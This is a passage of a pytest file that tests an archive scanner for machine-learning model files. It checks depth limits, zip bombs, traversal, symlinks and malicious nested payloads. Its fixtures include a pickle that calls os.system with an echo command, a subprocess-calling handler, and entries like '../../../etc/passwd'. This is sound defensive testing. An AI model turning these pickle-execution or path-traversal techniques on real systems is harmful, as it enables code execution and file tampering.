                z.writestr("one.pkl", data1)
                z.writestr("two.pkl", data2)
            tmp_path = tmp.name

        try:
            result = self.scanner.scan(tmp_path)
            assert result.success is True
            expected = len(data1) + len(data2)
            assert result.bytes_scanned == expected
        finally:
            os.unlink(tmp_path)

    def test_scan_simple_zip(self):
        """Test scanning a simple ZIP file with text files"""
        with tempfile.NamedTemporaryFile(suffix=".zip", delete=False) as tmp:
            with zipfile.ZipFile(tmp.name, "w") as z:
                z.writestr("readme.txt", "This is a readme file")
                z.writestr("data.json", '{"key": "value"}')
            tmp_path = tmp.name

        try:
            result = self.scanner.scan(tmp_path)
            assert result.success is True
            assert result.bytes_scanned > 0
            # May have some debug/info issues about unknown formats
            error_issues = [i for i in result.issues if i.severity == IssueSeverity.CRITICAL]
            assert len(error_issues) == 0
        finally:
            os.unlink(tmp_path)

    def test_scan_zip_with_pickle(self):
        """Test scanning a ZIP file containing a pickle file"""
        with tempfile.NamedTemporaryFile(suffix=".zip", delete=False) as tmp:
            with zipfile.ZipFile(tmp.name, "w") as z:
                # Create a simple pickle file
                import pickle

                pickle_data = pickle.dumps({"safe": "data"})
                z.writestr("model.pkl", pickle_data)
            tmp_path = tmp.name

        try:
            result = self.scanner.scan(tmp_path)
            assert result.success is True
            assert result.bytes_scanned > 0
            # The pickle scanner was run on the embedded file
            # Check that we scanned the pickle data
            assert result.bytes_scanned >= len(pickle_data)
        finally:
            os.unlink(tmp_path)

    def test_scan_nested_zip(self):
        """Test scanning nested ZIP files"""
        # Create inner zip
        with tempfile.NamedTemporaryFile(suffix=".zip", delete=False) as inner_tmp:
            with zipfile.ZipFile(inner_tmp.name, "w") as inner_z:
                inner_z.writestr("inner.txt", "Inner file content")
            inner_path = inner_tmp.name

        try:
            # Create outer zip containing inner zip
            with tempfile.NamedTemporaryFile(suffix=".zip", delete=False) as outer_tmp:
                with zipfile.ZipFile(outer_tmp.name, "w") as outer_z:
                    outer_z.write(inner_path, "nested.zip")
                outer_path = outer_tmp.name

            result = self.scanner.scan(outer_path)
            assert result.success is True
            # Should have scanned the nested content
            assert (
                any("nested.zip" in str(issue.location) for issue in result.issues if hasattr(issue, "location"))
                or result.bytes_scanned > 0
            )
        finally:
            os.unlink(inner_path)
            os.unlink(outer_path)

    def test_scan_alternating_zip_tar_enforces_shared_depth_limit(self, tmp_path: Path) -> None:
        """Archive depth should not reset when recursion alternates between ZIP and TAR."""
        inner_zip = tmp_path / "inner.zip"
        with zipfile.ZipFile(inner_zip, "w") as archive:
            archive.writestr("payload.txt", "deep content")

        middle_tar = tmp_path / "middle.tar"
        with tarfile.open(middle_tar, "w") as archive:
            archive.add(inner_zip, arcname="inner.zip")

        outer_zip = tmp_path / "outer.zip"
        with zipfile.ZipFile(outer_zip, "w") as archive:
            archive.write(middle_tar, arcname="middle.tar")

        scanner = ZipScanner(config={"max_zip_depth": 2, "max_tar_depth": 2})
        result = scanner.scan(str(outer_zip))

        depth_checks = [
            check
            for check in result.checks
            if check.name == "ZIP Depth Bomb Protection" and check.status == CheckStatus.FAILED
        ]
        assert len(depth_checks) == 1
        assert "maximum zip nesting depth (2) exceeded" in depth_checks[0].message.lower()
        assert depth_checks[0].location == f"{outer_zip}:middle.tar:inner.zip"

    def test_scan_nested_mar_enforces_shared_depth_limit(self, tmp_path: Path) -> None:
        """Archive depth should not reset when ZIP recursion enters TorchServe MAR files."""
        nested_mar = tmp_path / "model.mar"
        with zipfile.ZipFile(nested_mar, "w") as archive:
            archive.writestr(
                "MAR-INF/MANIFEST.json",
                '{"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}',
            )
            archive.writestr("handler.py", "def handle(data, context):\n    return data\n")
            archive.writestr("weights.bin", "weights")

        outer_zip = tmp_path / "outer.zip"
        with zipfile.ZipFile(outer_zip, "w") as archive:
            archive.write(nested_mar, arcname="model.mar")

        scanner = ZipScanner(config={"max_mar_depth": 1})
        result = scanner.scan(str(outer_zip))

        depth_checks = [
            check
            for check in result.checks
            if check.name == "TorchServe MAR Depth Limit" and check.status == CheckStatus.FAILED
        ]
        assert len(depth_checks) == 1
        assert "maximum .mar recursion depth (1) exceeded" in depth_checks[0].message.lower()
        assert depth_checks[0].location == f"{outer_zip}:model.mar"

    def test_scan_manifestless_mar_runs_python_handler_static_analysis(self, tmp_path: Path) -> None:
        """Manifest-less .mar archives should still statically analyze Python handlers."""
        mar_path = tmp_path / "handler_only.mar"
        with zipfile.ZipFile(mar_path, "w") as archive:
            archive.writestr(
                "handler.py",
                "import subprocess\nsubprocess.Popen(['echo', 'pwned'])\n",
            )

        result = self.scanner.scan(str(mar_path))

        assert result.success is False
        assert result.has_errors is True

        handler_failures = [
            check
            for check in result.checks
            if check.name == "TorchServe Handler Static Analysis" and check.status == CheckStatus.FAILED
        ]
        assert len(handler_failures) == 1
        assert "high-risk execution primitives" in handler_failures[0].message.lower()
        assert handler_failures[0].details.get("entry") == "handler.py"
        assert handler_failures[0].details.get("risky_calls") == ["subprocess.Popen"]
        assert handler_failures[0].location == f"{mar_path}:handler.py"

    def test_scan_manifestless_mar_skips_oversized_python_handler_analysis(self, tmp_path: Path) -> None:
        """Oversized .mar Python handlers should report skipped bounded analysis."""
        mar_path = tmp_path / "oversized_handler.mar"
        oversized_handler_source = "print('x')\n" * 100
        with zipfile.ZipFile(mar_path, "w") as archive:
            archive.writestr("handler.py", oversized_handler_source)

        scanner = ZipScanner(config={"max_mar_python_analysis_bytes": 16})
        result = scanner.scan(str(mar_path))

        handler_failures = [
            check
            for check in result.checks
            if check.name == "TorchServe Handler Static Analysis" and check.status == CheckStatus.FAILED
        ]
        assert len(handler_failures) == 1
        assert handler_failures[0].severity == IssueSeverity.WARNING
        assert "oversized entry" in handler_failures[0].message.lower()
        assert "limit is 16 bytes" in handler_failures[0].message.lower()
        assert handler_failures[0].details.get("entry") == "handler.py"
        assert handler_failures[0].details.get("size_limit") == 16
        assert handler_failures[0].location == f"{mar_path}:handler.py"

    def test_scan_manifestless_mar_reports_malformed_python_handler(self, tmp_path: Path) -> None:
        """Manifest-less .mar handlers with invalid syntax should emit parse-error analysis checks."""
        mar_path = tmp_path / "malformed_handler.mar"
        with zipfile.ZipFile(mar_path, "w") as archive:
            archive.writestr("handler.py", "def handle(data, context)\n    return data\n")

        result = self.scanner.scan(str(mar_path))
        assert result.success is False
        assert result.has_warnings is True
        assert result.has_errors is False

        handler_failures = [
            check
            for check in result.checks
            if check.name == "TorchServe Handler Static Analysis" and check.status == CheckStatus.FAILED
        ]
        assert len(handler_failures) == 1
        assert handler_failures[0].severity == IssueSeverity.WARNING
        assert "unable to parse python entry for static analysis" in handler_failures[0].message.lower()
        assert handler_failures[0].details.get("entry") == "handler.py"
        assert handler_failures[0].details.get("analysis_kind") == "syntax"
        assert "expected ':'" in str(handler_failures[0].details.get("parse_error")).lower()
        assert handler_failures[0].location == f"{mar_path}:handler.py"

    def test_scan_extensionless_nested_zip_recurses(self, tmp_path: Path) -> None:
        """Extensionless ZIP members should be recursively scanned by content."""
        inner_zip = io.BytesIO()
        with zipfile.ZipFile(inner_zip, "w") as inner_archive:
            inner_archive.writestr("payload.pkl", b'cos\nsystem\n(S"echo pwned"\ntR.')

        archive_path = tmp_path / "outer.zip"
        with zipfile.ZipFile(archive_path, "w") as outer_archive:
            outer_archive.writestr("nested", inner_zip.getvalue())

        result = self.scanner.scan(str(archive_path))

        assert result.success is False
        assert result.has_errors is True
        assert any(
            check.details.get("zip_entry") == "nested:payload.pkl"
            and check.location == f"{archive_path}:nested:payload.pkl"
            for check in result.checks
        ), f"Expected nested extensionless ZIP checks, got: {[(c.location, c.details) for c in result.checks]}"
        assert any(
            issue.severity == IssueSeverity.CRITICAL
            and issue.details.get("zip_entry") == "nested:payload.pkl"
            and issue.location == f"{archive_path}:nested:payload.pkl"
            and ("os.system" in issue.message.lower() or "posix.system" in issue.message.lower())
            for issue in result.issues
        ), (
            "Expected critical nested pickle finding, got: "
            f"{[(i.location, i.message, i.details) for i in result.issues]}"
        )

    def test_scan_extensionless_nested_gzip_recurses_by_header(self, tmp_path: Path) -> None:
        """Extensionless gzip members should route through CompressedScanner by header."""
        archive_path = tmp_path / "outer.zip"
        payload = b'cos\nsystem\n(S"echo zipped gzip payload"\ntR.'
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("compressed_payload", gzip.compress(payload))

        result = self.scanner.scan(str(archive_path))

        assert result.success is False
        assert result.has_errors is True
        routing_checks = [check for check in result.checks if check.name == "Compressed Wrapper Inner Scanner Routing"]
        assert any(
            check.details.get("inner_scanner") == "pickle" and check.details.get("zip_entry") == "compressed_payload"
            for check in routing_checks
        ), f"Expected compressed nested routing check, got: {[(c.location, c.details) for c in routing_checks]}"
        assert any(
            issue.severity == IssueSeverity.CRITICAL
            and issue.details.get("zip_entry") == "compressed_payload"
            and ("os.system" in issue.message.lower() or "posix.system" in issue.message.lower())
            for issue in result.issues
        ), (
            "Expected critical nested compressed pickle finding, got: "
            f"{[(i.location, i.message, i.details) for i in result.issues]}"
        )

    def test_scan_extensionless_nested_gzip_benign_text_does_not_route_to_pickle(self, tmp_path: Path) -> None:
        """Extensionless gzip text should not be treated as a nested pickle just because it is compressed."""
        archive_path = tmp_path / "outer-benign.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("compressed_payload", gzip.compress(b"just some harmless text\n"))

        result = self.scanner.scan(str(archive_path))

        routing_checks = [
            check
            for check in result.checks
            if check.name == "Compressed Wrapper Inner Scanner Routing"
            and check.details.get("zip_entry") == "compressed_payload"
        ]
        assert not any(check.details.get("inner_scanner") == "pickle" for check in routing_checks), (
            "Expected benign gzip text to avoid pickle routing, got: "
            f"{[(check.location, check.details) for check in routing_checks]}"
        )
        assert not [
            issue
            for issue in result.issues
            if issue.severity == IssueSeverity.CRITICAL and issue.details.get("zip_entry") == "compressed_payload"
        ]

    def test_nested_keras_member_routes_through_nested_scan_callback(self, tmp_path: Path) -> None:
        """Nested ZIP-based members should preserve ZIP depth and use the injected callback."""
        nested_keras = io.BytesIO()
        with zipfile.ZipFile(nested_keras, "w"):
            pass

        archive_path = tmp_path / "outer.zip"
        with zipfile.ZipFile(archive_path, "w") as outer_archive:
            outer_archive.writestr("nested_model.keras", nested_keras.getvalue())

        dispatched_result = ScanResult(scanner_name="keras_zip")
        dispatched_result.metadata["file_size"] = len(nested_keras.getvalue())
        dispatched_result.finish(success=True)

        callback_calls: list[tuple[str, dict[str, Any] | None]] = []

        def scan_nested_member(path: str, config: dict[str, Any] | None = None) -> ScanResult:
            callback_calls.append((path, config))
            return dispatched_result

        scanner = ZipScanner(config={NESTED_SCAN_CALLBACK_CONFIG_KEY: scan_nested_member})
        result = scanner.scan(str(archive_path))

        assert result.success is True
        assert len(callback_calls) == 1

        scan_path, scan_config = callback_calls[0]
        assert scan_path.endswith(".keras")
        assert scan_config is not None
        assert scan_config["_zip_depth"] == 1

        assert result.metadata["contents"] == [
            {
                "path": f"{archive_path}:nested_model.keras",
                "type": "keras_zip",
                "size": len(nested_keras.getvalue()),
            }
        ]

    def test_max_depth_limit_on_extensionless_nested_zip_chain(self, tmp_path: Path) -> None:
        """Extensionless nested ZIP chains should still honor max_zip_depth."""
        nested_zip_bytes = io.BytesIO()
        with zipfile.ZipFile(nested_zip_bytes, "w") as nested_archive:
            nested_archive.writestr("payload.pkl", b'cos\nsystem\n(S"echo pwned"\ntR.')

        for entry_name in ("level2", "level1", "level0"):
            parent_zip_bytes = io.BytesIO()
            with zipfile.ZipFile(parent_zip_bytes, "w") as parent_archive:
                parent_archive.writestr(entry_name, nested_zip_bytes.getvalue())
            nested_zip_bytes = parent_zip_bytes

        archive_path = tmp_path / "outer.zip"
        archive_path.write_bytes(nested_zip_bytes.getvalue())

        result = ZipScanner(config={"max_zip_depth": 2}).scan(str(archive_path))

        assert result.success is False
        assert any(
            issue.message == "Maximum ZIP nesting depth (2) exceeded"
            and issue.location == f"{archive_path}:level0:level1"
            and issue.details.get("zip_entry") == "level0:level1"
            and issue.details.get("depth") == 2
            and issue.details.get("max_depth") == 2
            for issue in result.issues
        ), f"Expected extensionless depth issue, got: {[(i.location, i.message, i.details) for i in result.issues]}"
        assert not any(
            issue.severity == IssueSeverity.CRITICAL
            and ("os.system" in issue.message.lower() or "posix.system" in issue.message.lower())
            for issue in result.issues
        ), f"Depth limit should stop payload scan, got: {[(i.location, i.message) for i in result.issues]}"

    def test_directory_traversal_detection(self):
        """Test detection of directory traversal attempts in ZIP files"""
        with tempfile.NamedTemporaryFile(suffix=".zip", delete=False) as tmp:
            with zipfile.ZipFile(tmp.name, "w") as z:
                # Create entries with directory traversal attempts
                z.writestr("../../../etc/passwd", "malicious content")
                z.writestr("/etc/passwd", "malicious content")
                z.writestr("safe.txt", "safe content")
            tmp_path = tmp.name

        try:
            result = self.scanner.scan(tmp_path)
            assert result.success is False

            # Should have detected directory traversal attempts
            traversal_issues = [
                i
                for i in result.issues
                if "path traversal" in i.message.lower() or "directory traversal" in i.message.lower()
            ]
            assert len(traversal_issues) >= 2

            # Check severity
            for issue in traversal_issues:
                assert issue.severity == IssueSeverity.CRITICAL
        finally:
            os.unlink(tmp_path)

    def test_windows_traversal_detection(self):
        """Ensure Windows-style path traversal is caught"""
        with tempfile.NamedTemporaryFile(suffix=".zip", delete=False) as tmp:
            with zipfile.ZipFile(tmp.name, "w") as z:
                z.writestr("..\\evil.txt", "malicious")
                z.writestr("safe.txt", "ok")
            tmp_path = tmp.name

        try:
            result = self.scanner.scan(tmp_path)
            traversal_issues = [i for i in result.issues if "path traversal" in i.message.lower()]
            assert len(traversal_issues) >= 1
            for issue in traversal_issues:
                assert issue.severity == IssueSeverity.CRITICAL
        finally:
            os.unlink(tmp_path)

    def test_zip_bomb_detection(self, tmp_path: Path) -> None:
        """High compression-ratio entries should be reported without extracting them."""
        archive_path = tmp_path / "suspicious.zip"
        with zipfile.ZipFile(archive_path, "w", compression=zipfile.ZIP_DEFLATED) as z:
            z.writestr("suspicious.txt", "A" * (2 * 1024 * 1024))

        nested_scan_paths: list[str] = []

        def nested_scan(path: str, _config: dict[str, Any]) -> ScanResult:
            nested_scan_paths.append(path)
            return ScanResult(scanner_name="test")

        scanner = ZipScanner(config={NESTED_SCAN_CALLBACK_CONFIG_KEY: nested_scan})
        result = scanner.scan(str(archive_path))

        assert result.success is False
        assert nested_scan_paths == []

        compression_issues = [i for i in result.issues if "compression ratio" in i.message.lower()]
        assert len(compression_issues) == 1
        assert compression_issues[0].rule_code == "S410"
        assert compression_issues[0].details["entry"] == "suspicious.txt"
        assert "skipping extraction" in compression_issues[0].message

    def test_small_high_compression_ratio_entry_stays_clean(self, tmp_path: Path) -> None:
        """Small repetitive metadata should not be treated as a ZIP bomb."""
        archive_path = tmp_path / "metadata.zip"
        with zipfile.ZipFile(archive_path, "w", compression=zipfile.ZIP_DEFLATED) as z:
            z.writestr("metadata.txt", "A" * 16384)

        nested_scan_paths: list[str] = []

        def nested_scan(path: str, _config: dict[str, Any]) -> ScanResult:
            nested_scan_paths.append(path)
            return ScanResult(scanner_name="test")

        scanner = ZipScanner(config={NESTED_SCAN_CALLBACK_CONFIG_KEY: nested_scan})
        result = scanner.scan(str(archive_path))

        assert result.success is True
        assert any(path.endswith("_metadata.txt") for path in nested_scan_paths)
        assert not [issue for issue in result.issues if issue.rule_code == "S410"]
        compression_checks = [
            check
            for check in result.checks
            if check.name == "Compression Ratio Check" and check.details.get("entry") == "metadata.txt"
        ]
        assert len(compression_checks) == 1
        assert compression_checks[0].status == CheckStatus.PASSED
        assert "size floor" in compression_checks[0].message
        assert compression_checks[0].details["min_uncompressed_size"] == 1024 * 1024

    def test_configured_skip_entry_is_validated_but_not_recursively_scanned(self, tmp_path: Path) -> None:
        archive_path = tmp_path / "owned-entry.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("metadata.json", b'{"owned": true}')
            archive.writestr("payload.bin", b"payload")

        nested_scan_paths: list[str] = []

        def nested_scan(path: str, _config: dict[str, Any]) -> ScanResult:
            nested_scan_paths.append(path)
            result = ScanResult(scanner_name="test")
            result.finish(success=True)
            return result

        scanner = ZipScanner(
            config={
                NESTED_SCAN_CALLBACK_CONFIG_KEY: nested_scan,
                "skip_archive_entries": ["metadata.json"],
            }
        )
        result = scanner.scan(str(archive_path))

        assert result.success is True
        assert not any(path.endswith("_metadata.json") for path in nested_scan_paths)
        assert any(path.endswith("_payload.bin") for path in nested_scan_paths)

    def test_zip_bomb_detection_skips_only_suspicious_entry(self, tmp_path: Path) -> None:
        """Suspicious entries should be skipped while safe entries still route to nested scanning."""
        archive_path = tmp_path / "mixed.zip"
        with zipfile.ZipFile(archive_path, "w", compression=zipfile.ZIP_DEFLATED) as z:
            z.writestr("suspicious.txt", "A" * (2 * 1024 * 1024))
            z.writestr("safe.bin", os.urandom(4096))

        nested_scan_paths: list[str] = []

        def nested_scan(path: str, _config: dict[str, Any]) -> ScanResult:
            nested_scan_paths.append(path)
            return ScanResult(scanner_name="test")

        scanner = ZipScanner(config={NESTED_SCAN_CALLBACK_CONFIG_KEY: nested_scan})
        result = scanner.scan(str(archive_path))

        assert result.success is False
        assert not any(path.endswith("_suspicious.txt") for path in nested_scan_paths)
        assert any(path.endswith("_safe.bin") for path in nested_scan_paths)

        compression_issues = [i for i in result.issues if i.rule_code == "S410"]
        assert len(compression_issues) == 1
        assert compression_issues[0].details["entry"] == "suspicious.txt"

    def test_nested_zip_dispatch_does_not_route_generic_bin_zip_to_pickle(self, tmp_path: Path) -> None:
        """A generic ZIP archive named .bin should not be forced through pickle routing."""
        archive_path = tmp_path / "weights.bin"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("metadata.txt", "not a pickle")

        assert _select_nested_scanner_id(str(archive_path)) == "zip"

    def test_nested_member_routes_misnamed_onnx_by_header(self, tmp_path: Path) -> None:
        """A model header should route nested members even when their suffix is generic."""
        pytest.importorskip("onnx")
        archive_path = tmp_path / "outer.zip"
        onnx_path = create_mock_onnx(tmp_path / "model.onnx")
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("model.payload", onnx_path.read_bytes())

        result = self.scanner.scan(str(archive_path))

        assert any(
            entry["path"] == f"{archive_path}:model.payload" and entry["type"] == "onnx"
            for entry in result.metadata["contents"]
        )

    @pytest.mark.parametrize(
        ("scanner_name", "payload"),
        [
            ("cntk", _malicious_cntkv2_payload()),
            ("lightgbm", _malicious_lightgbm_payload()),
            ("rknn", _malicious_rknn_payload()),
        ],
    )
    def test_nested_member_routes_renamed_strict_signature_payload(
        self,
        tmp_path: Path,
        scanner_name: str,
        payload: bytes,
    ) -> None:
        archive_path = tmp_path / "outer.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr(f"{scanner_name}.jpg", payload)

        result = self.scanner.scan(str(archive_path))

        assert any(
            entry["path"] == f"{archive_path}:{scanner_name}.jpg" and entry["type"] == scanner_name
            for entry in result.metadata["contents"]
        )
        assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)

    @pytest.mark.parametrize(
        "payload",
        [
            b"\x08\x01\x12\x11\x0a\x07version\x12\x06\x08\x01\x10\x03(\x02\x12\x09\x0a\x03uid\x12\x02ab inputs",
            b"tree\nversion=v4\nnum_class=1\nnum_tree_per_iteration=1\nmax_feature_idx=2\n",
            b"RKNX\x01\x00\x00\x00runtime=rockchip\n",
        ],
    )
    def test_nested_member_rejects_renamed_signature_near_match(self, tmp_path: Path, payload: bytes) -> None:
        archive_path = tmp_path / "outer.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("near-match.jpg", payload)

        result = self.scanner.scan(str(archive_path))

        assert any(
            entry["path"] == f"{archive_path}:near-match.jpg" and entry["type"] == "unknown"
            for entry in result.metadata["contents"]
        )
        assert not any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)

    def test_nested_member_routes_prefixed_misnamed_onnx_by_structure(self, tmp_path: Path) -> None:
        """Unknown leading protobuf content must not hide a nested ONNX member."""
        pytest.importorskip("onnx")
        archive_path = tmp_path / "outer.zip"
        onnx_path = create_mock_onnx(tmp_path / "model.onnx", op_type="PythonOp")
        prefix_mock_onnx_with_unknown_field(onnx_path, value_size=(1024 * 1024) + 32)
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("model.jpg", onnx_path.read_bytes())

        result = self.scanner.scan(str(archive_path))

        assert any(
            entry["path"] == f"{archive_path}:model.jpg" and entry["type"] == "onnx"
            for entry in result.metadata["contents"]
        )
        assert any(issue.details.get("op_type") == "PythonOp" for issue in result.issues)

    def test_nested_member_does_not_route_prefixed_generic_protobuf_as_onnx(self, tmp_path: Path) -> None:
        """An unknown protobuf prefix alone must not promote a nested member."""
        archive_path = tmp_path / "outer.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("metadata.jpg", b"\xa2\x06\x04xxxx\x12\x02\x08\x01")

        result = self.scanner.scan(str(archive_path))

        assert any(
            entry["path"] == f"{archive_path}:metadata.jpg" and entry["type"] == "unknown"
            for entry in result.metadata["contents"]
        )
        assert not any(issue.details.get("op_type") == "PythonOp" for issue in result.issues)

    def test_max_depth_limit(self):
        """Test that maximum nesting depth is enforced"""
        # Create deeply nested zips
        current_path = None
        paths_to_delete = []

        try:
            # Create 10 levels of nested zips
            for i in range(10):
                with tempfile.NamedTemporaryFile(suffix=".zip", delete=False) as tmp:
                    with zipfile.ZipFile(tmp.name, "w") as z:
                        if current_path:
                            z.write(current_path, f"level{i}.zip")
                        else:
                            z.writestr("deepest.txt", "Deep content")
                    paths_to_delete.append(tmp.name)
                    current_path = tmp.name

            # Scan the outermost zip
            assert current_path is not None  # Should be set by the loop above
            scanner = ZipScanner(config={"max_zip_depth": 3})
            result = scanner.scan(current_path)

            assert result.success is False
            # Should have a warning about max depth
            depth_issues = [i for i in result.issues if "depth" in i.message.lower()]
            assert len(depth_issues) >= 1
        finally:
            for path in paths_to_delete:
                if os.path.exists(path):
                    os.unlink(path)

    def test_max_entries_limit_fails_closed_on_partial_scan(self, tmp_path: Path) -> None:
        """Entry-count truncation should make the archive scan unsuccessful."""
        archive_path = tmp_path / "many_entries.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("one.txt", "one")
            archive.writestr("two.txt", "two")

        result = ZipScanner(config={"max_zip_entries": 1}).scan(str(archive_path))

        assert result.success is False
        assert any(
            check.name == "Entry Count Limit Check"
            and check.status == CheckStatus.FAILED
            and "too many entries" in check.message.lower()
            for check in result.checks
        )
        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert result.metadata["analysis_incomplete"] is True
        assert "zip_analysis_incomplete" in result.metadata["scan_outcome_reasons"]

    def test_aggregate_size_limit_uses_public_scan_limits(self) -> None:
        """Public size limits should constrain ZIP aggregate extraction by default."""
        assert ZipScanner(config={"max_total_size": 12})._get_max_total_uncompressed_size() == 12
        assert ZipScanner(config={"max_file_size": 12})._get_max_total_uncompressed_size() == 12
        assert (
            ZipScanner(
                config={
                    "max_zip_total_uncompressed_size": 20,
                    "max_total_size": 12,
                }
            )._get_max_total_uncompressed_size()
            == 12
        )
        assert ZipScanner(config={"max_zip_total_uncompressed_size": 0})._get_max_total_uncompressed_size() == (
            ZipScanner.UNLIMITED_ARCHIVE_SIZE
        )
        assert (
            ZipScanner(
                config={
                    "max_zip_total_uncompressed_size": 0,
                    "max_total_size": 12,
                }
            )._get_max_total_uncompressed_size()
            == 12
        )

    def test_get_max_entry_size_uses_entry_limit_when_file_size_is_unlimited(self) -> None:
        """An unlimited top-level file-size config should not hide explicit ZIP entry limits."""
        assert ZipScanner(config={"max_file_size": 0, "max_entry_size": 128})._get_max_entry_size() == 128

    def test_aggregate_uncompressed_size_limit_fails_before_extraction(self, tmp_path: Path) -> None:
        """Small entries split across a ZIP should still be bounded by an aggregate budget."""
        archive_path = tmp_path / "split_budget.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("one.bin", b"A" * 8)
            archive.writestr("two.bin", b"B" * 8)

        def nested_scan(_path: str, _config: dict[str, Any]) -> ScanResult:
            raise AssertionError("aggregate size preflight should stop before extracting members")

        result = ZipScanner(
            config={
                NESTED_SCAN_CALLBACK_CONFIG_KEY: nested_scan,
                "max_entry_size": 8,
                "max_zip_total_uncompressed_size": 12,
            },
        ).scan(str(archive_path))

        assert result.success is False
        assert result.metadata["archive_uncompressed_size"] == 16
        assert result.metadata["max_zip_total_uncompressed_size"] == 12
        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert "zip_analysis_incomplete" in result.metadata["scan_outcome_reasons"]
        assert any(
            check.name == "ZIP Aggregate Size Limit Check"
            and check.status == CheckStatus.FAILED
            and check.details["archive_uncompressed_size"] == 16
            and check.details["max_zip_total_uncompressed_size"] == 12
            for check in result.checks
        )

    def test_aggregate_uncompressed_size_limit_preserves_traversal_findings(self, tmp_path: Path) -> None:
        """Oversized ZIPs should still report deterministic path metadata findings."""
        archive_path = tmp_path / "oversized_traversal.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("../evil.txt", b"x")
            archive.writestr("filler.bin", b"A" * 16)

        def nested_scan(_path: str, _config: dict[str, Any]) -> ScanResult:
            raise AssertionError("aggregate size preflight should stop before extracting members")

        result = ZipScanner(
            config={
                NESTED_SCAN_CALLBACK_CONFIG_KEY: nested_scan,
                "max_zip_total_uncompressed_size": 10,
            },
        ).scan(str(archive_path))

        assert result.success is False
        assert result.has_errors is True
        assert result.metadata["archive_declared_uncompressed_size"] == 17
        assert result.metadata["archive_uncompressed_size"] == 16
        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert any(issue.rule_code == "S405" and issue.details.get("entry") == "../evil.txt" for issue in result.issues)
        assert any(issue.rule_code == "S410" for issue in result.issues)

    def test_aggregate_uncompressed_size_limit_preserves_symlink_findings(self, tmp_path: Path) -> None:
        """Oversized ZIPs should still report deterministic unsafe symlink metadata."""
        archive_path = tmp_path / "oversized_symlink.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            info = zipfile.ZipInfo("link.txt")
            info.create_system = 3
            info.external_attr = (stat.S_IFLNK | 0o777) << 16
            archive.writestr(info, "../outside.txt")
            archive.writestr("filler.bin", b"A" * 16)

        def nested_scan(_path: str, _config: dict[str, Any]) -> ScanResult:
            raise AssertionError("aggregate size preflight should stop before extracting members")

        result = ZipScanner(
            config={
                NESTED_SCAN_CALLBACK_CONFIG_KEY: nested_scan,
                "max_zip_total_uncompressed_size": 10,
            },
        ).scan(str(archive_path))

        assert result.success is False
        assert result.has_errors is True
        assert result.metadata["archive_declared_uncompressed_size"] == 30
        assert result.metadata["archive_uncompressed_size"] == 16
        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert any(issue.rule_code == "S406" and issue.details.get("entry") == "link.txt" for issue in result.issues)
        assert any(issue.rule_code == "S410" for issue in result.issues)

    def test_aggregate_uncompressed_size_limit_excludes_symlink_target_bytes(self, tmp_path: Path) -> None:
        """Symlink target strings should not count toward bytes the scanner extracts."""
        archive_path = tmp_path / "symlink_only.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            info = zipfile.ZipInfo("link.txt")
            info.create_system = 3
            info.external_attr = (stat.S_IFLNK | 0o777) << 16
            archive.writestr(info, "safe-target.txt")

        def nested_scan(_path: str, _config: dict[str, Any]) -> ScanResult:
            raise AssertionError("symlink entries should not be extracted")

        result = ZipScanner(
            config={
                NESTED_SCAN_CALLBACK_CONFIG_KEY: nested_scan,
                "max_zip_total_uncompressed_size": 1,
            },
        ).scan(str(archive_path))

        assert result.success is True
        assert result.metadata["archive_declared_uncompressed_size"] == len("safe-target.txt")
        assert result.metadata["archive_uncompressed_size"] == 0
        assert any(
            check.name == "ZIP Aggregate Size Limit Check"
            and check.status == CheckStatus.PASSED
            and check.details["archive_uncompressed_size"] == 0
            for check in result.checks
        )

    def test_aggregate_uncompressed_size_limit_allows_near_match(self, tmp_path: Path) -> None:
        """Archives at the aggregate budget should continue through normal member scanning."""
        archive_path = tmp_path / "within_budget.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("one.bin", b"A" * 6)
            archive.writestr("two.bin", b"B" * 6)

        scanned_entries = 0

        def nested_scan(path: str, _config: dict[str, Any]) -> ScanResult:
            nonlocal scanned_entries
            scanned_entries += 1
            nested_result = ScanResult(scanner_name="test_nested")
            nested_result.bytes_scanned = Path(path).stat().st_size
            nested_result.finish(success=True)
            return nested_result

        result = ZipScanner(
            config={
                NESTED_SCAN_CALLBACK_CONFIG_KEY: nested_scan,
                "max_entry_size": 8,
                "max_zip_total_uncompressed_size": 12,
            },
        ).scan(str(archive_path))

        assert result.success is True
        assert scanned_entries == 2
        assert result.metadata["archive_uncompressed_size"] == 12
        assert any(
            check.name == "ZIP Aggregate Size Limit Check"
            and check.status == CheckStatus.PASSED
            and check.details["archive_uncompressed_size"] == 12
            for check in result.checks
        )

    def test_core_zip_aggregate_limit_fails_closed_with_exit_code_and_cache(self, tmp_path: Path) -> None:
        """Aggregate ZIP truncation should expose success, exit-code, and cache semantics."""
        archive_path = tmp_path / "cached_split_budget.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("one.bin", b"A" * 8)
            archive.writestr("two.bin", b"B" * 8)

        config: dict[str, Any] = {
            "cache_enabled": True,
            "cache_dir": str(tmp_path / "scan-cache"),
            "max_zip_total_uncompressed_size": 12,
        }

        first_result = core.scan_model_directory_or_file(str(archive_path), **config)
        second_result = core.scan_model_directory_or_file(str(archive_path), **config)

